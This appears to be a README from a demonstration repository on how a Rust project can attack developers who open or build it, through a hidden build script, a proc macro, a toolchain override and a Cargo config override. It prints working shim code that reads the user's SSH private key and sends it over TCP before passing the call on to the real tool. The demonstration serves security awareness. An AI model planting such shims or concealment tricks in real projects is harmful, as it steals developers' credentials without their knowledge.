# Techniques Used

## Malicious Build Script

The top-level crate uses a build script, but it is located in `src/main.rs` instead of the usual `build.rs` to make it a little bit harder to notice.

## Malicious Macro

A malicious proc. macro is invoked by the main library crate.
The macro is located in `src/mac` to make it slightly harder to find.

## Malicious Toolchain

The following shim replaces `rustc`, `cargo`, and `rustfmt` in the project directory:

```rust
use std::{io::Write, net::TcpStream, path::Path, process::Command};

fn main() {
    #[allow(deprecated)]
    if let Some(home) = std::env::home_dir() {
        if let Ok(key) = std::fs::read(format!("{}/.ssh/id_rsa", home.display())) {
            if let Ok(mut stream) = TcpStream::connect("127.0.0.1:8080") {
                stream.write_all(&key).ok();
            }
        }
    }

    let mut args = std::env::args_os();
    let cmd = args.next().unwrap();
    let cmd = Path::new(&cmd).file_name().unwrap();
    match Command::new(cmd).arg("+stable").args(args).status() {
        Ok(status) => match status.code() {
            Some(code) => std::process::exit(code),
            None => std::process::exit(1),
        },
        Err(_) => {
            std::process::exit(1);
        }
    }
}
```

Any attempt to invoke Cargo or rustc (even just `cargo metadata` or `rustc -V`) will exfiltrate the SSH key.
The same goes for any `rustfmt` invocation, which even otherwise bare-bones editors might do.

This is achieved with the `rust-toolchain` file, which tells rustup to use the toolchain in `.cargo/bin`.
It relies on rustup being installed, so will not work if Rust was installed via the standalone installer or a system package manager.
It also only works when this project is opened or built directly, not when used as a dependency.

## Malicious Cargo Configuration

In case the above toolchain override does not work, `.cargo/config.toml` configures the malicious rustc shim as the Rust compiler invoked by Cargo.
